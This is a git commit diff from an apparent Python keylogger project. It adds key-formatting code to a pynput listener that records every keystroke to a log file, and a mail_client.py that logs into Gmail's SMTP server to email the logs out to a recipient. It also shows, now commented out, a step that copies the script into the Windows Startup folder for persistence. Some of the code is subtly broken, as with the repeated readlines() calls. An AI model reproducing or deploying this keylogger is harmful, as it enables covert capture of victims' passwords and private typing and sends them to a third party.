ebc99f8ea5632193f973b5e2bcb26ba91f1b071a
Ahmed <ahmedhamedaly19@gmail.com>
2020-11-17 23:23:32 +0000

    mail client set up

--- src/logger.py
+++ src/logger.py
@@ -8,11 +8,20 @@ username = os.getlogin()
 # Moved to hidden folder
 logging_dir = f'C:/Users/{username}/Desktop'
 
-copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/logger.py')
+#copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
 
 logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def key_handler(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == "Key.enter":
+        key = '\n'
+        
     logging.info(key)
 
 with Listener(on_press=key_handler) as listener:
---
+++ src/mail_client.py
@@ -0,0 +1,26 @@
+import smtplib
+import os
+import datetime
+
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+
+username = os.getlogin()
+server = smtplib.SMTP('smtp.gmail.com', 25)
+
+server.ehlo()
+
+with open('password.txt', 'r') as f:
+    email = f.readlines()[0]
+    password = f.readlines()[1]
+    to = f.readlines()[2]
+
+server.login(email, password)
+current_time = datetime.datetime.now()
+
+msg = MIMEMultipart()
+msg['From'] = f'{username}-Logs'
+msg['To'] = to
+msg['Subject'] = f'Logging-{username}: {current_time}'
